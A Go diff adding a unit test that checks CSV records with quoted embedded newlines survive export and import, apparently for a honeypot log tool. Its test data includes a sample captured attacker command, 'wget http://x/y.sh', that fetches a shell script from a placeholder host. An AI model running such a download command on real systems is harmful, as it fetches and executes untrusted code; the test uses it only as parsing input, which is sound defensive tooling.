@@ -37,3 +37,34 @@ func TestCSVExportImportRoundTrip(t *testing.T) {
 		}
 	}
 }
+
+// A field with an embedded newline (e.g. a multi-line attacker command) must
+// survive export -> import as one record, not be split into two broken rows.
+func TestCSVRecordsKeepQuotedNewlines(t *testing.T) {
+	rows := [][]string{
+		{"2026-01-01T00:00:00Z", "cowrie", "echo a\nwget http://x/y.sh", `say "hi"` + "\r\nbye"},
+		{"2026-01-01T00:00:01Z", "dionaea", "plain", ""},
+	}
+	var b strings.Builder
+	b.WriteString("timestamp,honeypot,command,note\r\n")
+	for _, r := range rows {
+		esc := make([]string, len(r))
+		for i, f := range r {
+			esc[i] = csvEscape(f)
+		}
+		b.WriteString(strings.Join(esc, ",") + "\n")
+	}
+	recs := splitCSVRecords(b.String())
+	if len(recs) != 1+len(rows) {
+		t.Fatalf("got %d records, want %d: %q", len(recs), 1+len(rows), recs)
+	}
+	if recs[0] != "timestamp,honeypot,command,note" {
+		t.Fatalf("header = %q", recs[0])
+	}
+	for i, r := range rows {
+		got := splitCSVLine(recs[i+1])
+		if strings.Join(got, "|") != strings.Join(r, "|") {
+			t.Errorf("row %d: got %q, want %q", i, got, r)
+		}
+	}
+}
